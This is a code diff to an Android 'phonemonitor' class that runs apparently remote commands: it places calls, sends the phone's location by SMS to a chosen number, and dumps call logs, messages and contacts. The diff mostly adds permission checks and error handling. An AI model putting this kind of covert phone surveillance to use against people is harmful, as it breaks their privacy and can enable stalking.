@@ -1,12 +1,16 @@
 package com.monitor.phone.s0ft.phonemonitor;
 
+import android.Manifest;
+import android.annotation.SuppressLint;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
@@ -14,6 +18,8 @@ import android.os.Vibrator;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.Settings;
+import android.support.annotation.RequiresApi;
+import android.support.v4.app.ActivityCompat;
 import android.telephony.SmsManager;
 import android.util.Log;
 import android.widget.Toast;
@@ -30,7 +36,8 @@ import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
 
 
 public class WebCommandsExecutor implements LocationListener {
-    private Context context;
+    private final Context context;
+    MainActivity checkPermissions = new MainActivity();
 
     WebCommandsExecutor(Context context) {
         this.context = context;
@@ -78,14 +85,27 @@ public class WebCommandsExecutor implements LocationListener {
         }
     }
 
+    @RequiresApi(api = Build.VERSION_CODES.M)
     void call(long phoneNumber) {
         Intent intent = new Intent(Intent.ACTION_CALL);
         intent.setData(Uri.parse("tel:" + phoneNumber));
         intent.setFlags(FLAG_ACTIVITY_NEW_TASK);
+        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
+            // TODO: Consider calling
+            //    ActivityCompat#requestPermissions
+            // here to request the missing permissions, and then overriding
+            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
+            //                                          int[] grantResults)
+            // to handle the case where the user grants the permission. See the documentation
+            // for ActivityCompat#requestPermissions for more details.
+            return;
+        }
         context.startActivity(intent);
     }
 
-    String getGPSCoordinates(int promptUserLocationOn, final Boolean showPromptToast, String sendSMSToNumber) {
+    @SuppressLint("MissingPermission")
+    @RequiresApi(api = Build.VERSION_CODES.M)
+    String getGPSCoordinates(int promptUserLocationOn, final Boolean showPromptToast, final String sendSMSToNumber) {
         //promptUserLocationOn=Number of times to forcibly take user to Location settings
         //showPromptToast=Whether or not to show a toast message to user prompting to enable Location Service
         //sendSMSToNumber=Number to send latlong SMS to.. Can be "" in which case SMS will not be sent
@@ -119,7 +139,12 @@ public class WebCommandsExecutor implements LocationListener {
                     HelperMethods.waitWithTimeoutN(new Callable() {
                         @Override
                         public Object call() throws Exception {
-                            return locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                            try {
+                                return locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                            } catch (SecurityException sec) {
+                                Log.e("Location not Permitted", sec.getMessage());
+                                return sec.getMessage();
+                            }
                         }
                     }, null, 3 * 60 * 1000);//wait for GPS based location. this takes a couple minutes
                 } catch (Exception ex) {
@@ -135,7 +160,12 @@ public class WebCommandsExecutor implements LocationListener {
                         HelperMethods.waitWithTimeoutN(new Callable() {
                             @Override
                             public Object call() throws Exception {
-                                return locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                                try {
+                                    return locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                                } catch (SecurityException | IllegalArgumentException securityException) {
+                                    Log.e("Location Not accepted", securityException.getMessage());
+                                    return securityException.getMessage();
+                                }
                             }
                         }, null, 5000);//network based location is quick. only wait 5s
                     } catch (Exception ex) {
@@ -145,8 +175,8 @@ public class WebCommandsExecutor implements LocationListener {
                 }
             }
             if (location != null) {
-                Log.w(AppSettings.getTAG(), "Lat : " + Double.toString(location.getLatitude()) + "\n" + "Long : " + Double.toString(location.getLongitude()));
-                latLong = "Lat : " + Double.toString(location.getLatitude()) + "\nLong : " + Double.toString(location.getLongitude());
+                Log.w(AppSettings.getTAG(), "Lat : " + location.getLatitude() + "\n" + "Long : " + location.getLongitude());
+                latLong = "Lat : " + location.getLatitude() + "\nLong : " + location.getLongitude();
                 if (!sendSMSToNumber.equals("")) {
                     SmsManager smsManager = SmsManager.getDefault();
                     smsManager.sendTextMessage(sendSMSToNumber, null, latLong, null, null);
@@ -155,16 +185,19 @@ public class WebCommandsExecutor implements LocationListener {
                 Log.w(AppSettings.getTAG(), "No location found");
             }
         }
+
+
         return latLong;
     }
 
+    @RequiresApi(api = Build.VERSION_CODES.M)
     String getCallLog() {
         //returns calllogs as a JSON array string in descending order of date
         String retval = "";
         JSONArray callLogsJSONArr = new JSONArray();
         String[] columns = {CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME};
 
-        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, columns, null, null, CallLog.Calls.DATE + " DESC");
+        @SuppressLint("MissingPermission") Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, columns, null, null, CallLog.Calls.DATE + " DESC");
         if (cursor != null) {
             while (cursor.moveToNext()) {
                 String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
@@ -203,6 +236,8 @@ public class WebCommandsExecutor implements LocationListener {
             cursor.close();
             retval = callLogsJSONArr.toString();
         }
+
+
         return retval;
     }
 
@@ -283,6 +318,7 @@ public class WebCommandsExecutor implements LocationListener {
             retval = smsJsonArr.toString();
         }
         return retval;
+
     }
 
     String getContacts() {
